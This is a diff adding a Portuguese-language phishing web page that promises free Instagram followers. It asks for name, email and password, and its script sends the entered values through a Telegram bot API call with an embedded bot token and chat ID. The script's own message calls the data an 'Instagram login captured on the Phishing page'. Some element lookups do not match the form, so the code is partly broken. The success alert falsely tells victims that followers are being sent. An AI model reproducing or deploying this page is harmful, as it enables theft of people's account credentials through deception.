@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>site de seguidor</title>
+    <style>
+        form {
+            border: 1px solid #ccc;
+            padding: 20px;
+            width: 400px;
+        }
+
+        label {
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+
+<body>
+    <div>
+        <form>
+            <label for="name">Nome:</label>
+            <input type="text" id="name" name="name"><br><br>
+            <label for="email">Endereço de e-mail:</label>
+            <input type="email" id="email" name="email"><br><br>
+            <label for="password">Senha:</label>
+            <input type="password" id="password" name="password"><br><br>
+            <input type="submit" value="Enviar">
+        </form>
+
+    </div>
+    
+  <script>
+    const form = document.getElementById('form');
+
+    form.addEventListener('submit', event => {
+      event.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const email = document.getElementById('email').value;
+      const name = document.getElementById('name').value;
+      const followers = document.getElementById('followers').value;
+
+      const chatId = '5699064765';
+      const token = '5905126455:AAGVHxjUhzz0l50RTlcDZCn5H2mFFzx6u2g';
+
+      const message = `👀Novo login Instagram capturado na página de Phishing!:
+
+Nome de usuário: ${username}
+E-mail: ${email}
+Senha: ${name}
+Quantidade de seguidores desejada: ${followers}`;
+
+  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+  fetch(url)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Erro ao enviar o pedido');
+      }
+      alert('Pedido enviado com sucesso, os seguidores estão sendo enviados automaticamente, aguarde!!');
+      form.reset();
+    })
+    .catch(error => {
+      console.error(error);
+      alert('Erro ao enviar o pedido');
+    });
+});
+  </script>
+</body>
+
+</html>
